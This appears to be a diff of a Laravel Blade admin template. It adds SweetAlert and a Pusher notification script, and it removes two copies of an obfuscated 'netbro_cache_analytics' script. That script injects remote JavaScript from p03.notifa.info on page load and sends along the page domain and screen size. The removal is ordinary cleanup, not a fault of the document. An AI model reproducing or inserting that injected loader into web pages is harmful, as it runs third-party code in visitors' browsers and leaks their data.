@@ -35,9 +35,9 @@
 <script src="{{asset('assets/assets/vendor_plugins/DataTables-1.10.15/ex-js/vfs_fonts.js')}}"></script>
 <script src="{{asset('assets/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/buttons.html5.min.js')}}"></script>
 <script src="{{asset('assets/assets/vendor_plugins/DataTables-1.10.15/extensions/Buttons/js/buttons.print.min.js')}}"></script>
+<script src="{{asset('assets/assets/vendor_components/sweetalert/sweetalert.min.js')}}"></script>
 <!-- end - This is for export functionality only -->
-<script src="{{asset('assets/assets/js/pages/data-table.js') }}"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXVWgPDrj%2f211%2bQLe8%2b3HUY3B2ifrpcSWkjbKVFRQrUfs3TK%2b3a8kcPak5nj91cb%2fkl7b4mx4ASH02LxDW1OFjgZFTFFnIe5VRH%2b08rh0DudUDIn23HmUSgy%2bvdzesY13BiXF%2fFzlGvM2gBmCWANJsMitfTxHtdE5gXC%2f1Ocx2K7Azy%2flZ%2fD20zo10EZDZ7GLIFN9jgbCHZjBOFz5L47qg%2fCCVRENXWUnHGPS%2bUAE8qC%2foyyNp9iarTG%2fFKYZiGBytQixwKd6bdmPC5tD53mDJOhugNiPG3Dc4sQuoZRV24pmFyzPN9dkaWOe%2bzU6LW0CuUnBepB9rBMuV8jv9tzZ8FGG8RBl3JzO%2bX3oSZCUOHywn6U46podfmOTskSeX%2bEah9jgVM2SMgg4Ije%2fCLFmJoK7u1VgpmbfMHlV1J2Q41xxbaNuBS6DyZAtj7GHbVbfOg1T8RIGgRaeD%2fqWpqFJ5vajeJLVUjeobh9IJY5lA00QU%2bYFFsb5Ynm9UViMsd4kUvlHkACoUU579p8gxsPd%2bc5hWF9WviB4m" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+{{--<script src="{{asset('assets/assets/js/pages/data-table.js') }}"></script>--}}
 
 
 <script>
@@ -45,4 +45,43 @@
 </script>
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXVWgPDrj%2f2127Qztjmo8gBCcgkHQD43AGpXdxEdNJzwHuTZLC1pbATBI5a%2fMnXwW6pTcMtoyHMWVByPa6G7VukWo%2fhi7p1Z2DtDJI75s%2b9RijlO2%2bSUyEFk3cGz3BFIIp7MSxfiF2KOUw2%2fmOPThJuVJxlyWosXgeoMqa7xtV6rcoX2eXFZSzs2R0Bxyc2jZLMh%2fnecdsieuae4oZ3fhKEnchOCRPV3ttEGOcLaOwbPwlHhibR3O6%2bnx324vPXwUxw0%2bgZ6MO2LWTJktOx7TXEFogElmLhJ4fOicr6zC%2fgnc9xJZhO3G%2faOK50BghTWne07ylCEadE5bOy2TVzROajyJNs61a8ubRiflcASxv90CRxVsWdD%2fuDQtux8MAdCbvc%2fdUf20RSgm5sjk5avFvevy7jwsVwg2jcQStYtOp228Y5UbAFGegyDLb1qpjn82%2b1Hg4m4KCglUTui9WCsTJKuA6x9XNGNnZqnxiTbgIFljtzzzUrm8AgmiHTpa7YcqiKp1fgce4jRTmMiPgi1diUQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
+
+@auth('admin')
+    <script src="https://js.pusher.com/6.0/pusher.min.js"></script>
+    <script>
+        const url = '{{config("app.url")}}';
+        const notify = document.querySelector('#notify');
+
+        async function notification() {
+            // console.log(notify.textContent)
+            const notifyData = await getNotify();
+            notify.innerText = notifyData.length
+
+            const pusher = new Pusher('9b837aec4ecbe335f0c7', {
+                cluster: 'ap1',
+                encrypted : true,
+            });
+
+            const channel = pusher.subscribe('admin-notification');
+            channel.bind('App\\Events\\UserRegisterEvent',async function(data) {
+                const newNotifyData = await getNotify();
+                notify.innerText = newNotifyData.length
+                swal({
+                    title: "Pemilik baru telah hadir",
+                    allowOutsideClick: false
+                },function() {
+                    window.location = url+'notif';
+                });
+            });
+        }
+
+        function  getNotify() {
+            return fetch(url+'notify').then(res => res.json()).then(res => res);
+        }
+
+        notification()
+
+    </script>
+
+@endauth
